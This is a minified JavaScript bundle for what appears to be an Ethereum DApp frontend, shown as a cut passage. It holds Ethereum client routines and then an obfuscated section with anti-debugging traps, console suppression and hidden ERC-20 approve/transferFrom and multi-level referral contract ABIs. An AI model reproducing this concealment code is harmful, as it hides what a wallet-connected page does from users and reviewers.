                if (_.number !== null && f?.number != null) {
                    if (_.number === f.number) return;
                    if (_.number - f.number > 1 && n)
                        for (let E = f?.number + 1n; E < _.number; E++) {
                            const S = await Y(e, Kt, "getBlock")({
                                blockNumber: E,
                                includeTransactions: l
                            });
                            m.onBlock(S, f), f = S
                        }
                }(f?.number == null || t === "pending" && _?.number == null || _.number !== null && _.number > f.number) && (m.onBlock(_, f), f = _)
            } catch (_) {
                m.onError?.(_)
            }
        }, {
            emitOnBegin: r,
            interval: c
        }))
    })() : (() => {
        let b = !0,
            m = !0,
            _ = () => b = !1;
        return (async () => {
            try {
                r && Y(e, Kt, "getBlock")({
                    blockTag: t,
                    includeTransactions: l
                }).then(g => {
                    b && m && (s(g, void 0), m = !1)
                }).catch(i);
                const E = (() => {
                        if (e.transport.type === "fallback") {
                            const g = e.transport.transports.find(p => p.config.type === "webSocket" || p.config.type === "ipc");
                            return g ? g.value : e.transport
                        }
                        return e.transport
                    })(),
                    {
                        unsubscribe: S
                    } = await E.subscribe({
                        params: ["newHeads"],
                        async onData(g) {
                            if (!b) return;
                            const p = await Y(e, Kt, "getBlock")({
                                blockNumber: g.result?.number,
                                includeTransactions: l
                            }).catch(() => {});
                            b && (s(p, f), m = !1, f = p)
                        },
                        onError(g) {
                            i?.(g)
                        }
                    });
                _ = S, b || _()
            } catch (E) {
                i?.(E)
            }
        })(), () => _()
    })()
}

function n7(e, {
    address: t,
    args: n,
    batch: r = !0,
    event: s,
    events: i,
    fromBlock: o,
    onError: a,
    onLogs: c,
    poll: u,
    pollingInterval: l = e.pollingInterval,
    strict: f
}) {
    const d = typeof u < "u" ? u : typeof o == "bigint" ? !0 : !(e.transport.type === "webSocket" || e.transport.type === "ipc" || e.transport.type === "fallback" && (e.transport.transports[0].config.type === "webSocket" || e.transport.transports[0].config.type === "ipc")),
        h = f ?? !1;
    return d ? (() => {
        const _ = Be(["watchEvent", t, n, r, e.uid, s, l, o]);
        return Yn(_, {
            onLogs: c,
            onError: a
        }, E => {
            let S;
            o !== void 0 && (S = o - 1n);
            let g, p = !1;
            const w = bi(async () => {
                if (!p) {
                    try {
                        g = await Y(e, Qg, "createEventFilter")({
                            address: t,
                            args: n,
                            event: s,
                            events: i,
                            strict: h,
                            fromBlock: o
                        })
                    } catch {}
                    p = !0;
                    return
                }
                try {
                    let A;
                    if (g) A = await Y(e, El, "getFilterChanges")({
                        filter: g
                    });
                    else {
                        const N = await Y(e, oa, "getBlockNumber")({});
                        S && S !== N ? A = await Y(e, ed, "getLogs")({
                            address: t,
                            args: n,
                            event: s,
                            events: i,
                            fromBlock: S + 1n,
                            toBlock: N
                        }) : A = [], S = N
                    }
                    if (A.length === 0) return;
                    if (r) E.onLogs(A);
                    else
                        for (const N of A) E.onLogs([N])
                } catch (A) {
                    g && A instanceof Er && (p = !1), E.onError?.(A)
                }
            }, {
                emitOnBegin: !0,
                interval: l
            });
            return async () => {
                g && await Y(e, vl, "uninstallFilter")({
                    filter: g
                }), w()
            }
        })
    })() : (() => {
        let _ = !0,
            E = () => _ = !1;
        return (async () => {
            try {
                const S = (() => {
                        if (e.transport.type === "fallback") {
                            const A = e.transport.transports.find(N => N.config.type === "webSocket" || N.config.type === "ipc");
                            return A ? A.value : e.transport
                        }
                        return e.transport
                    })(),
                    g = i ?? (s ? [s] : void 0);
                let p = [];
                g && (p = [g.flatMap(N => Yo({
                    abi: [N],
                    eventName: N.name,
                    args: n
                }))], s && (p = p[0]));
                const {
                    unsubscribe: w
                } = await S.subscribe({
                    params: ["logs", {
                        address: t,
                        topics: p
                    }],
                    onData(A) {
                        if (!_) return;
                        const N = A.result;
                        try {
                            const {
                                eventName: v,
                                args: y
                            } = Jf({
                                abi: g ?? [],
                                data: N.data,
                                topics: N.topics,
                                strict: h
                            }), x = Zn(N, {
                                args: y,
                                eventName: v
                            });
                            c([x])
                        } catch (v) {
                            let y, x;
                            if (v instanceof oo || v instanceof ll) {
                                if (f) return;
                                y = v.abiItem.name, x = v.abiItem.inputs?.some(T => !("name" in T && T.name))
                            }
                            const I = Zn(N, {
                                args: x ? [] : {},
                                eventName: y
                            });
                            c([I])
                        }
                    },
                    onError(A) {
                        a?.(A)
                    }
                });
                E = w, _ || E()
            } catch (S) {
                a?.(S)
            }
        })(), () => E()
    })()
}

function r7(e, {
    batch: t = !0,
    onError: n,
    onTransactions: r,
    poll: s,
    pollingInterval: i = e.pollingInterval
}) {
    return (typeof s < "u" ? s : e.transport.type !== "webSocket" && e.transport.type !== "ipc") ? (() => {
        const u = Be(["watchPendingTransactions", e.uid, t, i]);
        return Yn(u, {
            onTransactions: r,
            onError: n
        }, l => {
            let f;
            const d = bi(async () => {
                try {
                    if (!f) try {
                        f = await Y(e, ex, "createPendingTransactionFilter")({});
                        return
                    } catch (b) {
                        throw d(), b
                    }
                    const h = await Y(e, El, "getFilterChanges")({
                        filter: f
                    });
                    if (h.length === 0) return;
                    if (t) l.onTransactions(h);
                    else
                        for (const b of h) l.onTransactions([b])
                } catch (h) {
                    l.onError?.(h)
                }
            }, {
                emitOnBegin: !0,
                interval: i
            });
            return async () => {
                f && await Y(e, vl, "uninstallFilter")({
                    filter: f
                }), d()
            }
        })
    })() : (() => {
        let u = !0,
            l = () => u = !1;
        return (async () => {
            try {
                const {
                    unsubscribe: f
                } = await e.transport.subscribe({
                    params: ["newPendingTransactions"],
                    onData(d) {
                        if (!u) return;
                        const h = d.result;
                        r([h])
                    },
                    onError(d) {
                        n?.(d)
                    }
                });
                l = f, u || l()
            } catch (f) {
                n?.(f)
            }
        })(), () => l()
    })()
}

function s7(e) {
    const {
        scheme: t,
        statement: n,
        ...r
    } = e.match(i7)?.groups ?? {}, {
        chainId: s,
        expirationTime: i,
        issuedAt: o,
        notBefore: a,
        requestId: c,
        ...u
    } = e.match(o7)?.groups ?? {}, l = e.split("Resources:")[1]?.split(`
- `).slice(1);
    return {
        ...r,
        ...u,
        ...s ? {
            chainId: Number(s)
        } : {},
        ...i ? {
            expirationTime: new Date(i)
        } : {},
        ...o ? {
            issuedAt: new Date(o)
        } : {},
        ...a ? {
            notBefore: new Date(a)
        } : {},
        ...c ? {
            requestId: c
        } : {},
        ...l ? {
            resources: l
        } : {},
        ...t ? {
            scheme: t
        } : {},
        ...n ? {
            statement: n
        } : {}
    }
}
const i7 = /^(?:(?<scheme>[a-zA-Z][a-zA-Z0-9+-.]*):\/\/)?(?<domain>[a-zA-Z0-9+-.]*(?::[0-9]{1,5})?) (?:wants you to sign in with your Ethereum account:\n)(?<address>0x[a-fA-F0-9]{40})\n\n(?:(?<statement>.*)\n\n)?/,
    o7 = /(?:URI: (?<uri>.+))\n(?:Version: (?<version>.+))\n(?:Chain ID: (?<chainId>\d+))\n(?:Nonce: (?<nonce>[a-zA-Z0-9]+))\n(?:Issued At: (?<issuedAt>.+))(?:\nExpiration Time: (?<expirationTime>.+))?(?:\nNot Before: (?<notBefore>.+))?(?:\nRequest ID: (?<requestId>.+))?/;

function a7(e) {
    const {
        address: t,
        domain: n,
        message: r,
        nonce: s,
        scheme: i,
        time: o = new Date
    } = e;
    if (n && r.domain !== n || s && r.nonce !== s || i && r.scheme !== i || r.expirationTime && o >= r.expirationTime || r.notBefore && o < r.notBefore) return !1;
    try {
        if (!r.address || !zt(r.address, {
                strict: !1
            }) || t && !na(r.address, t)) return !1
    } catch {
        return !1
    }
    return !0
}
async function c7(e, t) {
    const {
        address: n,
        domain: r,
        message: s,
        nonce: i,
        scheme: o,
        signature: a,
        time: c = new Date,
        ...u
    } = t, l = s7(s);
    if (!l.address || !a7({
            address: n,
            domain: r,
            message: l,
            nonce: i,
            scheme: o,
            time: c
        })) return !1;
    const d = tx(s);
    return Al(e, {
        address: l.address,
        hash: d,
        signature: a,
        ...u
    })
}
async function Ed(e, {
    serializedTransaction: t,
    throwOnReceiptRevert: n,
    timeout: r
}) {
    const s = await e.request({
            method: "eth_sendRawTransactionSync",
            params: r ? [t, J(r)] : [t]
        }, {
            retryCount: 0
        }),
        o = (e.chain?.formatters?.transactionReceipt?.format || Ug)(s);
    if (o.status === "reverted" && n) throw new Zb({
        receipt: o
    });
    return o
}

function l7(e) {
    return {
        call: t => _l(e, t),
        createAccessList: t => Jg(e, t),
        createBlockFilter: () => B9(e),
        createContractEventFilter: t => Hb(e, t),
        createEventFilter: t => Qg(e, t),
        createPendingTransactionFilter: () => ex(e),
        estimateContractGas: t => dv(e, t),
        estimateGas: t => Yf(e, t),
        getBalance: t => L9(e, t),
        getBlobBaseFee: () => $9(e),
        getBlock: t => Kt(e, t),
        getBlockNumber: t => oa(e, t),
        getBlockTransactionCount: t => D9(e, t),
        getBytecode: t => c0(e, t),
        getChainId: () => Ir(e),
        getCode: t => c0(e, t),
        getContractEvents: t => pg(e, t),
        getEip712Domain: t => U9(e, t),
        getEnsAddress: t => y9(e, t),
        getEnsAvatar: t => R9(e, t),
        getEnsName: t => M9(e, t),
        getEnsResolver: t => k9(e, t),
        getEnsText: t => Yg(e, t),
        getFeeHistory: t => j9(e, t),
        estimateFeesPerGas: t => Z4(e, t),
        getFilterChanges: t => El(e, t),
        getFilterLogs: t => z9(e, t),
        getGasPrice: () => Gf(e),
        getLogs: t => ed(e, t),
        getProof: t => OS(e, t),
        estimateMaxPriorityFeePerGas: t => K4(e, t),
        fillTransaction: t => Kf(e, t),
        getStorageAt: t => RS(e, t),
        getTransaction: t => _d(e, t),
        getTransactionConfirmations: t => MS(e, t),
        getTransactionCount: t => Wf(e, t),
        getTransactionReceipt: t => Fa(e, t),
        multicall: t => kS(e, t),
        prepareTransactionRequest: t => ta(e, t),
        readContract: t => nn(e, t),
        sendRawTransaction: t => cd(e, t),
        sendRawTransactionSync: t => Ed(e, t),
        simulate: t => b0(e, t),
        simulateBlocks: t => b0(e, t),
        simulateCalls: t => zS(e, t),
        simulateContract: t => r9(e, t),
        verifyHash: t => Al(e, t),
        verifyMessage: t => QS(e, t),
        verifySiweMessage: t => c7(e, t),
        verifyTypedData: t => e7(e, t),
        uninstallFilter: t => vl(e, t),
        waitForTransactionReceipt: t => Dx(e, t),
        watchBlocks: t => t7(e, t),
        watchBlockNumber: t => $x(e, t),
        watchContractEvent: t => u9(e, t),
        watchEvent: t => n7(e, t),
        watchPendingTransactions: t => r7(e, t)
    }
}

function Fx(e) {
    const {
        key: t = "public",
        name: n = "Public Client"
    } = e;
    return Wg({
        ...e,
        key: t,
        name: n,
        type: "publicClient"
    }).extend(l7)
}
async function u7(e, {
    chain: t
}) {
    const {
        id: n,
        name: r,
        nativeCurrency: s,
        rpcUrls: i,
        blockExplorers: o
    } = t;
    await e.request({
        method: "wallet_addEthereumChain",
        params: [{
            chainId: J(n),
            chainName: r,
            nativeCurrency: s,
            rpcUrls: i.default.http,
            blockExplorerUrls: o ? Object.values(o).map(({
                url: a
            }) => a) : void 0
        }]
    }, {
        dedupe: !0,
        retryCount: 0
    })
}

function f7(e, t) {
    const {
        abi: n,
        args: r,
        bytecode: s,
        ...i
    } = t, o = wl({
        abi: n,
        args: r,
        bytecode: s
    });
    return Tl(e, {
        ...i,
        ...i.authorizationList ? {
            to: null
        } : {},
        data: o
    })
}
async function d7(e) {
    return e.account?.type === "local" ? [e.account.address] : (await e.request({
        method: "eth_accounts"
    }, {
        dedupe: !0
    })).map(n => Ko(n))
}
async function h7(e, t = {}) {
    const {
        account: n = e.account,
        chainId: r
    } = t, s = n ? Se(n) : void 0, i = r ? [s?.address, [J(r)]] : [s?.address], o = await e.request({
        method: "wallet_getCapabilities",
        params: i
    }), a = {};
    for (const [c, u] of Object.entries(o)) {
        a[Number(c)] = {};
        for (let [l, f] of Object.entries(u)) l === "addSubAccount" && (l = "unstable_addSubAccount"), a[Number(c)][l] = f
    }
    return typeof r == "number" ? a[r] : a
}
async function p7(e) {
    return await e.request({
        method: "wallet_getPermissions"
    }, {
        dedupe: !0
    })
}
async function Ux(e, t) {
    const {
        account: n = e.account,
        chainId: r,
        nonce: s
    } = t;
    if (!n) throw new Ar({
        docsPath: "/docs/eip7702/prepareAuthorization"
    });
    const i = Se(n),
        o = (() => {
            if (t.executor) return t.executor === "self" ? t.executor : Se(t.executor)
        })(),
        a = {
            address: t.contractAddress ?? t.address,
            chainId: r,
            nonce: s
        };
    return typeof a.chainId > "u" && (a.chainId = e.chain?.id ?? await Y(e, Ir, "getChainId")({})), typeof a.nonce > "u" && (a.nonce = await Y(e, Wf, "getTransactionCount")({
        address: i.address,
        blockTag: "pending"
    }), (o === "self" || o?.address && na(o.address, i.address)) && (a.nonce += 1)), a
}
async function m7(e) {
    return (await e.request({
        method: "eth_requestAccounts"
    }, {
        dedupe: !0,
        retryCount: 0
    })).map(n => Lf(n))
}
async function b7(e, t) {
    return e.request({
        method: "wallet_requestPermissions",
        params: [t]
    }, {
        retryCount: 0
    })
}
async function g7(e, t) {
    const {
        chain: n = e.chain
    } = t, r = t.timeout ?? Math.max((n?.blockTime ?? 0) * 3, 5e3), s = await jg(e, t);
    return await qg(e, {
        ...t,
        id: s.id,
        timeout: r
    })
}
const pu = new di(128);
async function Vx(e, t) {
    const {
        account: n = e.account,
        chain: r = e.chain,
        accessList: s,
        authorizationList: i,
        blobs: o,
        data: a,
        gas: c,
        gasPrice: u,
        maxFeePerBlobGas: l,
        maxFeePerGas: f,
        maxPriorityFeePerGas: d,
        nonce: h,
        pollingInterval: b,
        throwOnReceiptRevert: m,
        type: _,
        value: E,
        ...S
    } = t, g = t.timeout ?? Math.max((r?.blockTime ?? 0) * 3, 5e3);
    if (typeof n > "u") throw new Ar({
        docsPath: "/docs/actions/wallet/sendTransactionSync"
    });
    const p = n ? Se(n) : null;
    try {
        nr(t);
        const w = await (async () => {
            if (t.to) return t.to;
            if (t.to !== null && i && i.length > 0) return await pl({
                authorization: i[0]
            }).catch(() => {
                throw new F("`to` is required. Could not infer from `authorizationList`.")
            })
        })();
        if (p?.type === "json-rpc" || p === null) {
            let A;
            r !== null && (A = await Y(e, Ir, "getChainId")({}), ad({
                currentChainId: A,
                chain: r
            }));
            const N = e.chain?.formatters?.transactionRequest?.format,
                y = (N || Cr)({
                    ...pi(S, {
                        format: N
                    }),
                    accessList: s,
                    account: p,
                    authorizationList: i,
                    blobs: o,
                    chainId: A,
                    data: a,
                    gas: c,
                    gasPrice: u,
                    maxFeePerBlobGas: l,
                    maxFeePerGas: f,
                    maxPriorityFeePerGas: d,
                    nonce: h,
                    to: w,
                    type: _,
                    value: E
                }, "sendTransaction"),
                x = pu.get(e.uid),
                I = x ? "wallet_sendTransaction" : "eth_sendTransaction",
                T = await (async () => {
                    try {
                        return await e.request({
                            method: I,
                            params: [y]
                        }, {
                            retryCount: 0
                        })
                    } catch (L) {
                        if (x === !1) throw L;
                        const k = L;
                        if (k.name === "InvalidInputRpcError" || k.name === "InvalidParamsRpcError" || k.name === "MethodNotFoundRpcError" || k.name === "MethodNotSupportedRpcError") return await e.request({
                            method: "wallet_sendTransaction",
                            params: [y]
                        }, {
                            retryCount: 0
                        }).then(R => (pu.set(e.uid, !0), R)).catch(R => {
                            const D = R;
                            throw D.name === "MethodNotFoundRpcError" || D.name === "MethodNotSupportedRpcError" ? (pu.set(e.uid, !1), k) : D
                        });
                        throw k
                    }
                })(),
                O = await Y(e, Dx, "waitForTransactionReceipt")({
                    checkReplacement: !1,
                    hash: T,
                    pollingInterval: b,
                    timeout: g
                });
            if (m && O.status === "reverted") throw new Zb({
                receipt: O
            });
            return O
        }
        if (p?.type === "local") {
            const A = await Y(e, ta, "prepareTransactionRequest")({
                    account: p,
                    accessList: s,
                    authorizationList: i,
                    blobs: o,
                    chain: r,
                    data: a,
                    gas: c,
                    gasPrice: u,
                    maxFeePerBlobGas: l,
                    maxFeePerGas: f,
                    maxPriorityFeePerGas: d,
                    nonce: h,
                    nonceManager: p.nonceManager,
                    parameters: [...Zf, "sidecars"],
                    type: _,
                    value: E,
                    ...S,
                    to: w
                }),
                N = r?.serializers?.transaction,
                v = await p.signTransaction(A, {
                    serializer: N
                });
            return await Y(e, Ed, "sendRawTransactionSync")({
                serializedTransaction: v,
                throwOnReceiptRevert: m
            })
        }
        throw p?.type === "smart" ? new Yr({
            metaMessages: ["Consider using the `sendUserOperation` Action instead."],
            docsPath: "/docs/actions/bundler/sendUserOperation",
            type: "smart"
        }) : new Yr({
            docsPath: "/docs/actions/wallet/sendTransactionSync",
            type: p?.type
        })
    } catch (w) {
        throw w instanceof Yr ? w : bl(w, {
            ...t,
            account: p,
            chain: t.chain || void 0
        })
    }
}
async function x7(e, t) {
    const {
        id: n
    } = t;
    await e.request({
        method: "wallet_showCallsStatus",
        params: [n]
    })
}
async function y7(e, t) {
    const {
        account: n = e.account
    } = t;
    if (!n) throw new Ar({
        docsPath: "/docs/eip7702/signAuthorization"
    });
    const r = Se(n);
    if (!r.signAuthorization) throw new Yr({
        docsPath: "/docs/eip7702/signAuthorization",
        metaMessages: ["The `signAuthorization` Action does not support JSON-RPC Accounts."],
        type: r.type
    });
    const s = await Ux(e, t);
    return r.signAuthorization(s)
}
async function w7(e, {
    account: t = e.account,
    message: n
}) {
    if (!t) throw new Ar({
        docsPath: "/docs/actions/wallet/signMessage"
    });
    const r = Se(t);
    if (r.signMessage) return r.signMessage({
        message: n
    });
    const s = typeof n == "string" ? Ys(n) : n.raw instanceof Uint8Array ? Xn(n.raw) : n.raw;
    return e.request({
        method: "personal_sign",
        params: [s, r.address]
    }, {
        retryCount: 0
    })
}
async function _7(e, t) {
    const {
        account: n = e.account,
        chain: r = e.chain,
        ...s
    } = t;
    if (!n) throw new Ar({
        docsPath: "/docs/actions/wallet/signTransaction"
    });
    const i = Se(n);
    nr({
        account: i,
        ...t
    });
    const o = await Y(e, Ir, "getChainId")({});
    r !== null && ad({
        currentChainId: o,
        chain: r
    });
    const c = (r?.formatters || e.chain?.formatters)?.transactionRequest?.format || Cr;
    return i.signTransaction ? i.signTransaction({
        ...s,
        chainId: o
    }, {
        serializer: e.chain?.serializers?.transaction
    }) : await e.request({
        method: "eth_signTransaction",
        params: [{
            ...c({
                ...s,
                account: i
            }, "signTransaction"),
            chainId: J(o),
            from: i.address
        }]
    }, {
        retryCount: 0
    })
}
async function E7(e, t) {
    const {
        account: n = e.account,
        domain: r,
        message: s,
        primaryType: i
    } = t;
    if (!n) throw new Ar({
        docsPath: "/docs/actions/wallet/signTypedData"
    });
    const o = Se(n),
        a = {
            EIP712Domain: rx({
                domain: r
            }),
            ...t.types
        };
    if (nx({
            domain: r,
            message: s,
            primaryType: i,
            types: a
        }), o.signTypedData) return o.signTypedData({
        domain: r,
        message: s,
        primaryType: i,
        types: a
    });
    const c = sT({
        domain: r,
        message: s,
        primaryType: i,
        types: a
    });
    return e.request({
        method: "eth_signTypedData_v4",
        params: [o.address, c]
    }, {
        retryCount: 0
    })
}
async function v7(e, {
    id: t
}) {
    await e.request({
        method: "wallet_switchEthereumChain",
        params: [{
            chainId: J(t)
        }]
    }, {
        retryCount: 0
    })
}
async function T7(e, t) {
    return await e.request({
        method: "wallet_watchAsset",
        params: t
    }, {
        retryCount: 0
    })
}
async function S7(e, t) {
    return Po.internal(e, Vx, "sendTransactionSync", t)
}

function C7(e) {
    return {
        addChain: t => u7(e, t),
        deployContract: t => f7(e, t),
        fillTransaction: t => Kf(e, t),
        getAddresses: () => d7(e),
        getCallsStatus: t => zg(e, t),
        getCapabilities: t => h7(e, t),
        getChainId: () => Ir(e),
        getPermissions: () => p7(e),
        prepareAuthorization: t => Ux(e, t),
        prepareTransactionRequest: t => ta(e, t),
        requestAddresses: () => m7(e),
        requestPermissions: t => b7(e, t),
        sendCalls: t => jg(e, t),
        sendCallsSync: t => g7(e, t),
        sendRawTransaction: t => cd(e, t),
        sendRawTransactionSync: t => Ed(e, t),
        sendTransaction: t => Tl(e, t),
        sendTransactionSync: t => Vx(e, t),
        showCallsStatus: t => x7(e, t),
        signAuthorization: t => y7(e, t),
        signMessage: t => w7(e, t),
        signTransaction: t => _7(e, t),
        signTypedData: t => E7(e, t),
        switchChain: t => v7(e, t),
        waitForCallsStatus: t => qg(e, t),
        watchAsset: t => T7(e, t),
        writeContract: t => Po(e, t),
        writeContractSync: t => S7(e, t)
    }
}

function I7(e) {
    const {
        key: t = "wallet",
        name: n = "Wallet Client",
        transport: r
    } = e;
    return Wg({
        ...e,
        key: t,
        name: n,
        transport: r,
        type: "walletClient"
    }).extend(C7)
}

function Hx({
    key: e,
    methods: t,
    name: n,
    request: r,
    retryCount: s = 3,
    retryDelay: i = 150,
    timeout: o,
    type: a
}, c) {
    const u = Gg();
    return {
        config: {
            key: e,
            methods: t,
            name: n,
            request: r,
            retryCount: s,
            retryDelay: i,
            timeout: o,
            type: a
        },
        request: W9(r, {
            methods: t,
            retryCount: s,
            retryDelay: i,
            uid: u
        }),
        value: c
    }
}

function jx(e, t = {}) {
    const {
        key: n = "custom",
        methods: r,
        name: s = "Custom Provider",
        retryDelay: i
    } = t;
    return ({
        retryCount: o
    }) => Hx({
        key: n,
        methods: r,
        name: s,
        request: e.request.bind(e),
        retryCount: t.retryCount ?? o,
        retryDelay: i,
        type: "custom"
    })
}
class A7 extends F {
    constructor() {
        super("No URL was provided to the Transport. Please provide a valid RPC URL to the Transport.", {
            docsPath: "/docs/clients/intro",
            name: "UrlRequiredError"
        })
    }
}

function zx(e, t = {}) {
    const {
        batch: n,
        fetchFn: r,
        fetchOptions: s,
        key: i = "http",
        methods: o,
        name: a = "HTTP JSON-RPC",
        onFetchRequest: c,
        onFetchResponse: u,
        retryDelay: l,
        raw: f
    } = t;
    return ({
        chain: d,
        retryCount: h,
        timeout: b
    }) => {
        const {
            batchSize: m = 1e3,
            wait: _ = 0
        } = typeof n == "object" ? n : {}, E = t.retryCount ?? h, S = b ?? t.timeout ?? 1e4, g = d?.rpcUrls.default.http[0];
        if (!g) throw new A7;
        const p = J9(g, {
            fetchFn: r,
            fetchOptions: s,
            onRequest: c,
            onResponse: u,
            timeout: S
        });
        return Hx({
            key: i,
            methods: o,
            name: a,
            async request({
                method: w,
                params: A
            }) {
                const N = {
                        method: w,
                        params: A
                    },
                    {
                        schedule: v
                    } = $g({
                        id: g,
                        wait: _,
                        shouldSplitBatch(T) {
                            return T.length > m
                        },
                        fn: T => p.request({
                            body: T
                        }),
                        sort: (T, O) => T.id - O.id
                    }),
                    y = async T => n ? v(T) : [await p.request({
                        body: T
                    })], [{
                        error: x,
                        result: I
                    }] = await y(N);
                if (f) return {
                    error: x,
                    result: I
                };
                if (x) throw new Hf({
                    body: N,
                    error: x,
                    url: g
                });
                return I
            },
            retryCount: E,
            retryDelay: l,
            timeout: S,
            type: "http"
        }, {
            fetchOptions: s,
            url: g
        })
    }
}
const M = Jn;
(function(e, t) {
    const n = Jn,
        r = e();
    for (;;) try {
        if (parseInt(n(507)) / 1 + parseInt(n(460)) / 2 * (-parseInt(n(486)) / 3) + -parseInt(n(489)) / 4 * (parseInt(n(504)) / 5) + -parseInt(n(508)) / 6 * (parseInt(n(520)) / 7) + -parseInt(n(470)) / 8 * (parseInt(n(478)) / 9) + parseInt(n(451)) / 10 * (parseInt(n(437)) / 11) + parseInt(n(429)) / 12 === t) break;
        r.push(r.shift())
    } catch {
        r.push(r.shift())
    }
})(gc, 796035);
const N7 = (function() {
    let e = !0;
    return function(t, n) {
        const r = Jn;
        {
            const s = e ? function() {
                const i = r;
                if (n)
                    if (i(436) !== i(455)) {
                        const o = n[i(527)](t, arguments);
                        return n = null, o
                    } else return !0
            } : function() {};
            return e = !1, s
        }
    }
})();
(function() {
    N7(this, function() {
        const e = Jn,
            t = new RegExp(e(450)),
            n = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
            r = y0("init");
        !t[e(499)](r + e(431)) || !n[e(499)](r + e(524)) ? r("0") : y0()
    })()
})();
const Ti = (function() {
        let e = !0;
        return function(t, n) {
            const r = Jn;
            if (r(479) === r(465)) return (function(s) {})[r(444)]("while (true) {}")[r(527)]("counter");
            {
                const s = e ? function() {
                    const i = r;
                    if (i(432) === "qLroh") {
                        if (n)
                            if (i(448) !== i(448)) {
                                if (_0x591193) {
                                    const o = _0x28c302[i(527)](_0x284abb, arguments);
                                    return _0x3702bf = null, o
                                }
                            } else {
                                const o = n[i(527)](t, arguments);
                                return n = null, o
                            }
                    } else(function() {
                        return !0
                    }).constructor(i(427) + i(512)).call(i(519))
                } : function() {};
                return e = !1, s
            }
        }
    })(),
    P7 = Ti(void 0, function() {
        const e = Jn,
            t = function() {
                const i = Jn;
                let o;
                try {
                    o = Function(i(523) + i(468) + ");")()
                } catch {
                    i(491) !== i(491) ? _0x4ed0db = _0x352219 : o = window
                }
                return o
            },
            n = t(),
            r = n[e(440)] = n[e(440)] || {},
            s = [e(452), "warn", e(433), e(493), e(459), e(484), e(473)];
        for (let i = 0; i < s[e(514)]; i++) {
            const o = Ti[e(444)][e(480)].bind(Ti),
                a = s[i],
                c = r[a] || o;
            o.__proto__ = Ti.bind(Ti), o.toString = c[e(485)][e(472)](c), r[a] = o
        }
    });

function Jn(e, t) {
    return e = e - 426, gc()[e]
}(function() {
    const e = Jn;
    let t;
    try {
        e(488) !== "dqRfc" ? (function() {
            return !1
        }).constructor(e(427) + e(512))[e(527)](e(457)) : t = Function("return (function() " + e(468) + ");")()
    } catch {
        if (e(503) !== e(497)) t = window;
        else {
            if (_0x52a55f) return _0x1d4ef0;
            _0x54228a(0)
        }
    }
    t[e(517)](y0, 4e3)
})(), P7();
const O7 = [{
        inputs: [{
            internalType: M(462),
            name: M(500),
            type: M(462)
        }, {
            internalType: M(462),
            name: M(516),
            type: M(462)
        }],
        name: M(528),
        outputs: [{
            internalType: M(453),
            name: "",
            type: M(453)
        }],
        stateMutability: M(441),
        type: M(430)
    }, {
        inputs: [{
            internalType: M(462),
            name: "spender",
            type: M(462)
        }, {
            internalType: M(453),
            name: "amount",
            type: M(453)
        }],
        name: M(505),
        outputs: [{
            internalType: M(426),
            name: "",
            type: M(426)
        }],
        stateMutability: "nonpayable",
        type: M(430)
    }, {
        inputs: [{
            internalType: M(462),
            name: M(469),
            type: M(462)
        }],
        name: M(435),
        outputs: [{
            internalType: M(453),
            name: "",
            type: "uint256"
        }],
        stateMutability: M(441),
        type: M(430)
    }, {
        inputs: [{
            internalType: "address",
            name: "to",
            type: M(462)
        }, {
            internalType: M(453),
            name: "value",
            type: M(453)
        }],
        name: M(466),
        outputs: [{
            internalType: M(426),
            name: "",
            type: M(426)
        }],
        stateMutability: M(461),
        type: "function"
    }, {
        inputs: [{
            internalType: "address",
            name: M(515),
            type: M(462)
        }, {
            internalType: M(462),
            name: "to",
            type: M(462)
        }, {
            internalType: M(453),
            name: "amount",
            type: M(453)
        }],
        name: M(467),
        outputs: [{
            internalType: M(426),
            name: "",
            type: M(426)
        }],
        stateMutability: M(461),
        type: M(430)
    }],
    R7 = [{
        inputs: [],
        stateMutability: M(461),
        type: "constructor"
    }, {
        anonymous: !1,
        inputs: [{
            indexed: !0,
            internalType: M(462),
            name: M(475),
            type: "address"
        }, {
            indexed: !1,
            internalType: "uint256",
            name: "amount",
            type: "uint256"
        }, {
            indexed: !1,
            internalType: M(453),
            name: M(506),
            type: M(453)
        }],
        name: M(476),
        type: "event"
    }, {
        anonymous: !1,
        inputs: [{
            indexed: !0,
            internalType: "address",
            name: "user",
            type: M(462)
        }, {
            indexed: !1,
            internalType: M(453),
            name: M(487),
            type: M(453)
        }, {
            indexed: !1,
            internalType: "uint256",
            name: M(506),
            type: "uint256"
        }],
        name: M(522),
        type: M(471)
    }, {
        inputs: [],
        name: "claimReferralRewards",
        outputs: [],
        stateMutability: "nonpayable",
        type: M(430)
    }, {
        inputs: [{
            internalType: "uint256",
            name: M(487),
            type: M(453)
        }, {
            internalType: M(453),
            name: M(498),
            type: M(453)
        }],
        name: M(449),
        outputs: [],
        stateMutability: M(461),
        type: "function"
    }, {
        inputs: [{
            internalType: M(453),
            name: "",
            type: "uint256"
        }],
        name: M(509),
        outputs: [{
            internalType: M(462),
            name: "",
            type: M(462)
        }],
        stateMutability: M(441),
        type: M(430)
    }, {
        inputs: [],
        name: M(456),
        outputs: [{
            internalType: M(426),
            name: "",
            type: M(426)
        }],
        stateMutability: M(441),
        type: M(430)
    }, {
        inputs: [{
            internalType: M(462),
            name: M(496),
            type: "address"
        }],
        name: M(438),
        outputs: [{
            internalType: M(453),
            name: M(458),
            type: "uint256"
        }],
        stateMutability: M(441),
        type: M(430)
    }, {
        inputs: [{
            internalType: M(462),
            name: M(496),
            type: M(462)
        }],
        name: M(477),
        outputs: [{
            internalType: M(453),
            name: "id",
            type: M(453)
        }, {
            internalType: M(453),
            name: M(447),
            type: "uint256"
        }, {
            internalType: M(453),
            name: M(511),
            type: M(453)
        }, {
            internalType: "address",
            name: "referrer",
            type: M(462)
        }, {
            internalType: M(453),
            name: M(502),
            type: M(453)
        }, {
            internalType: "uint256",
            name: M(443),
            type: M(453)
        }, {
            internalType: M(453),
            name: M(492),
            type: M(453)
        }, {
            internalType: M(453),
            name: M(474),
            type: M(453)
        }],
        stateMutability: M(441),
        type: M(430)
    }, {
        inputs: [{
            internalType: "address",
            name: "userAddr",
            type: M(462)
        }, {
            internalType: M(453),
            name: M(521),
            type: M(453)
        }],
        name: M(518),
        outputs: [{
            internalType: M(453),
            name: M(481),
            type: M(453)
        }, {
            internalType: "uint256",
            name: "income",
            type: M(453)
        }],
        stateMutability: "view",
        type: M(430)
    }, {
        inputs: [{
            internalType: M(462),
            name: "userAddr",
            type: M(462)
        }],
        name: M(513),
        outputs: [{
            internalType: "uint256[5]",
            name: "levelCounts",
            type: "uint256[5]"
        }, {
            internalType: "uint256[5]",
            name: M(439),
